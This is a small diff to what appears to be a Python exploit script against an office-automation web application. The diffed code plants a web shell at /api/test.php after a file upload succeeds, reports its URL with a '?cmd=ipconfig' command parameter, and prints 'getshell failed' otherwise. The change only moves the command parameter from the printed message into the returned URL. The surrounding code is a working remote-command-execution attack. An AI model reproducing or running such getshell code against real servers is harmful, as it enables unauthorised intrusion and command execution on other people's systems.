@@ -56,7 +56,7 @@ def upload_file(web_path):
     webshell = ''
     
     if '数据库脚本导入完成' in res.text:
-        webshell = '{}/api/test.php'.format(oa_addr)
+        webshell = '{}/api/test.php?cmd=ipconfig'.format(oa_addr)
 
     return webshell
 
@@ -90,7 +90,7 @@ def main():
     if web_path:
         webshell = upload_file(web_path)
         if webshell:
-            print('webshell: (GET) {}?cmd=ipconfig'.format(webshell))
+            print('webshell: (GET) {}'.format(webshell))
             return True
     
     print('getshell failed.')
